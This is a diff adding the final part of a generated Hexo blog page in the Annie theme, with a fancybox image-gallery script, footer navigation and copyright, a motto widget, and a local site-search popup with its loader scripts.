+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
